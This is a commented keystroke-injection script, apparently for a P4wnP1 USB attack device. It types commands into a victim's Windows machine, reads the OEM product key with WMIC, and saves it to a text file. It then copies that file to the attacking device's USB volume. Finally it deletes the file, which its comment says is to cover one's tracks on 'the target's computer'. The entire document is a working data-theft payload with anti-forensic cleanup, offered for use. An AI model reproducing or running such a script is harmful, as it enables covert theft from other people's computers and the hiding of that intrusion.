layout('us'); // Keyboard layout
typingSpeed(20,0) // Typing speed, random speed +/-
delay(1000) // Initial delay for use with the TriggerActions templates
press("GUI r"); // Opens Run
delay(200)
type("cmd\n") // Opens Command Prompt
delay(7000) // Depending on computer speed & how often system programs are used, this may vary. I find 7 seconds works well enough.
type("wmic path softwarelicensingservice get OA3xOriginalProductKey\n") // The actual command to display the PK
press("F11") // Makes it easier for copying
delay(4000) // Sometimes it takes a bit for the PK to show up
click(BT1) 
press("CTRL a")
delay(100)
press("CTRL c") // Highlighting and copying to clipboard
delay(100)
type("copy con productkey.txt\n") // Makes a .txt file labeled productkey
delay(2000)
press("CTRL v") 
delay(1000)
press("CTRL z\n") // Pasting and saving to .txt
delay(100)
type("exit\n")
delay(500)
press("GUI r")
delay(1000)
type("powershell\n") // Going into powershell to run the more versatile commands
delay(10000) // Looong delay, powershell sometimes takes a bit to boot
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'FTP6624' } | select name\n") 
// This fun bit of code, look at Seytonic's video on YouTube regarding P4wnP1 A.L.O.A. Basically just finds and copies to the Pi
type("copy productkey.txt $usbpath.name\n")
delay(100)
type("del productkey.txt\n") // Deletes the .txt from the target's computer to cover one's tracks
delay(100)
type("exit\n") // Aaaand scene!
